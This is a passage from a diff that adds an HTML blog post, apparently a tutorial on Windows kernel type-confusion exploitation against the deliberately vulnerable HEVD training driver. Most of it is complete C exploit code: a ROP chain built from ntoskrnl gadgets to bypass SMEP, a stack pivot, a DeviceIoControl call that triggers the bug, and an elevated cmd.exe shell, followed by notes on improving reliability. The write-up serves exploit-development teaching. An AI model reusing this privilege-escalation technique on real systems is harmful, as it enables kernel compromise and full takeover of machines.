+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3788b6</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0xC</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  BOOL bBlocked;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvAllocation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvAllocTarget <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of nt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of nt: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Allocate memory one page before the target memory region. This helps prevent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the Double Fault; Logic here is avoid not triggering &#34;Demand Paging&#34;. */</span>
+</span></span><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0x48000000</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocation to be made at 0x%p - PAGE_SIZE</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocTarget);
+</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
+</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
+</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully created allocation: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Trigger the Type Confusion by overwriting the function pointer */</span>
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28d700</span>; <span style="color:#75715e">// mov esp, 0x48000000 ; add esp, 0x28 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Let the Kernel breathe... this is needed to avoid a crash, my thoery is
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     if we don&#39;t do this the allocation will not be mapped properly. So what
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     we need to do is sleep for a few seconds to allow this to happen! First
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     time trying this I was under the impression VirtualLock was needed, but
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     when testing it never locked? So after debugging I found this to be the
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     solution. This exploit succeded 9/10 times vs the original 2/10 ;D */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Letting the kernel breathe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">1000</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fill the page before the target region with random data */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>(lpvAllocation, <span style="color:#ae81ff">0x1000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Write the gadget chain at the location we return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WriteGadgets</span>(lpvNtKrnl, (lpvAllocTarget <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy the shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If you followed along, we had a valid page? So why did we need VirtualLock?</p>
+<p>Well&hellip; we didn&rsquo;t! The exploit shown above did not use the VirtualLock function at all. When debugging we saw that the page was valid&hellip; in addition VirtualLock never succeeded&hellip; I would keep getting the error code ERROR_NOACCESS (0x3E6) meaning the page never &ldquo;locked&rdquo;.</p>
+<p>If you check the documentation on MSDN you&rsquo;ll see that two calls are needed sometimes, due to the way this function works. Does it need higher privileges? Not sure but I removed it to test if it was doing anything, and to my suprise it wasn&rsquo;t.</p>
+<p>In addition I found exploitation to be really unreliable. In order to make it work 90% of the time (If not 100%), what needed to be done?</p>
+<p>You guessed it! A call to <code>Sleep()</code> :P</p>
+<p>My thoery is that the allocation needed time to &ldquo;register&rdquo;. Regardless exploitation demo shown below!</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/exploit.gif" alt="alt text"></p>
+<h1 id="sources">Sources</h1>
+<pre tabindex="0"><code>https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f
+https://kristal-g.github.io/2021/02/20/HEVD_Type_Confusion_Windows_10_RS5_x64.html
+https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
